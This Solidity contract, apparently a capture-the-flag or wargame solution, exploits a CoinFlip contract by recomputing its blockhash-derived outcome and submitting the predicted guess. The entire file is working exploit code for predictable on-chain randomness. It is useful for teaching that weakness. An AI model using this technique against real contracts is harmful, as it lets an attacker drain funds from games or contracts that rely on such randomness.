// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

contract CoinFlipAttack {

	uint256 lastHash;
  	uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

	address TARGET;

	constructor(address _target) {
        set_target(_target);
	}

	// set contract address to target
	function set_target(address _target) public {
		TARGET = _target;
	}

	// use same logic as coin flip contract to predict the flip
	function predict_flip() public returns (bool) {

		// taken directly from flip function in CoinFlip contract
		uint256 blockValue = uint256(blockhash(block.number - 1));

	    if (lastHash == blockValue) {
	      revert();
	    }

	    lastHash = blockValue;
	    uint256 coinFlip = blockValue / FACTOR;
	    bool side = coinFlip == 1 ? true : false;

	    return side;
	}

	function make_guess() public {
		bool guess = predict_flip();
		CoinFlip cf = CoinFlip(TARGET);
		cf.flip(guess);
	}

}
